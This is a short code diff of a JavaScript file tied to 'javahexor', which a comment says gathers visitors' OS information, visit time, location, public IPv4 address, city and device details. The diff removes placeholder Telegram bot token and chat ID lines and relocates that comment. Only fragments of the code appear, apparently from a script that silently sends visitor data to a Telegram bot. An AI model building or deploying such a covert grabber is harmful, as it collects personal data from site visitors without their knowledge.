@@ -1,8 +1,4 @@
-// FOr More Info Visit -> https://github.com/Whitecat18/javahexor
-// New : Get OS Information, The Time does he opens the site. Location, Public Ipv4 , City , Device Basic Info ..etc 
 
-    const botToken = 'YOUR_BOT_API_KEY';
-    const chatId = 'YOUR_CHAT_ID';
 
     const getIP = async () => {
       try {
@@ -67,3 +63,6 @@
       .catch(error => console.log(error));
 
 // Coded By 5mU7X
+// FOr More Info Visit -> https://github.com/Whitecat18/javahexor
+
+
